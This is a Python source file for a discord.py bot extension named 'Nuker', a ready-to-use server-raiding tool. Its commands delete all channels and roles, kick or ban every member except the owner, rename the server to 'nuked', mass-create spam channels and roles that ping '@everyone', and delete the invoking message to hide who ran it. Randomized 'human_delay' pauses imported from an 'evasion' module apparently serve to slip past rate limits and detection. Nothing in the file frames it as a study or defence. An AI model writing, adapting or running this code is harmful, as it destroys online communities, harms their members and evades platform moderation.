import asyncio
import random
import discord
from discord.ext import commands

try:
    from evasion.delay import human_delay
except Exception:
    async def human_delay(lo=0.2, hi=0.5):
        await asyncio.sleep(random.uniform(lo, hi))

class Nuker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._stop = False

    @commands.command(name="nuke")
    async def nuke(self, ctx, confirm: str = None):
        await ctx.message.delete()
        g = ctx.guild
        if not g:
            return
        if confirm != "confirm":
            await ctx.send("`nuke confirm` to run", delete_after=5)
            return
        self._stop = False
        try:
            await g.edit(name="nuked")
        except Exception:
            pass
        for ch in list(g.channels):
            if self._stop:
                break
            try:
                await ch.delete()
            except Exception:
                pass
            await human_delay(0.15, 0.4)
        for role in list(g.roles):
            if self._stop:
                break
            if role.is_default() or (g.me and role >= g.me.top_role):
                continue
            try:
                await role.delete()
            except Exception:
                pass
            await human_delay(0.15, 0.35)
        for m in list(g.members):
            if self._stop:
                break
            if m == g.me or m == g.owner:
                continue
            try:
                await m.kick(reason="nuked")
            except Exception:
                pass
            await human_delay(0.15, 0.35)
        for i in range(12):
            if self._stop:
                break
            try:
                ch = await g.create_text_channel(f"nuked-{i}")
                await ch.send("@everyone")
            except Exception:
                pass
            await human_delay(0.2, 0.45)
        print(f"[NUKE] done {g.id}")

    @commands.command(name="stopnuke")
    async def stopnuke(self, ctx):
        self._stop = True
        await ctx.message.delete()
        await ctx.send("nuke stop flagged", delete_after=3)

    @commands.command(name="masschannel")
    async def masschannel(self, ctx, count: int = 30, *, name: str = "nuked"):
        await ctx.message.delete()
        count = max(1, min(count, 100))
        ok = 0
        for i in range(count):
            if self._stop:
                break
            try:
                await ctx.guild.create_text_channel(f"{name}-{i}")
                ok += 1
            except Exception:
                pass
            await human_delay(0.15, 0.4)
        await ctx.send(f"channels {ok}", delete_after=4)

    @commands.command(name="massrole")
    async def massrole(self, ctx, count: int = 30, *, name: str = "nuked"):
        await ctx.message.delete()
        count = max(1, min(count, 100))
        ok = 0
        for i in range(count):
            try:
                await ctx.guild.create_role(name=f"{name}-{i}")
                ok += 1
            except Exception:
                pass
            await human_delay(0.15, 0.35)
        await ctx.send(f"roles {ok}", delete_after=4)

    @commands.command(name="banall")
    async def banall(self, ctx, confirm: str = None):
        await ctx.message.delete()
        if confirm != "confirm":
            await ctx.send("`banall confirm`", delete_after=4)
            return
        ok = 0
        for m in list(ctx.guild.members):
            if m == ctx.guild.me or m == ctx.guild.owner:
                continue
            try:
                await m.ban(reason="nuked", delete_message_days=0)
                ok += 1
            except Exception:
                pass
            await human_delay(0.2, 0.45)
        await ctx.send(f"banned {ok}", delete_after=5)

    @commands.command(name="kickall")
    async def kickall(self, ctx, confirm: str = None):
        await ctx.message.delete()
        if confirm != "confirm":
            await ctx.send("`kickall confirm`", delete_after=4)
            return
        ok = 0
        for m in list(ctx.guild.members):
            if m == ctx.guild.me or m == ctx.guild.owner:
                continue
            try:
                await m.kick(reason="nuked")
                ok += 1
            except Exception:
                pass
            await human_delay(0.2, 0.4)
        await ctx.send(f"kicked {ok}", delete_after=5)

    @commands.command(name="delchannels")
    async def delchannels(self, ctx, confirm: str = None):
        await ctx.message.delete()
        if confirm != "confirm":
            await ctx.send("`delchannels confirm`", delete_after=4)
            return
        ok = 0
        for ch in list(ctx.guild.channels):
            try:
                await ch.delete()
                ok += 1
            except Exception:
                pass
            await human_delay(0.15, 0.35)
        await ctx.send(f"deleted {ok} channels", delete_after=4)

    @commands.command(name="delroles")
    async def delroles(self, ctx, confirm: str = None):
        await ctx.message.delete()
        if confirm != "confirm":
            await ctx.send("`delroles confirm`", delete_after=4)
            return
        ok = 0
        for role in list(ctx.guild.roles):
            if role.is_default() or (ctx.guild.me and role >= ctx.guild.me.top_role):
                continue
            try:
                await role.delete()
                ok += 1
            except Exception:
                pass
            await human_delay(0.15, 0.35)
        await ctx.send(f"deleted {ok} roles", delete_after=4)

async def setup(bot):
    await bot.add_cog(Nuker(bot))
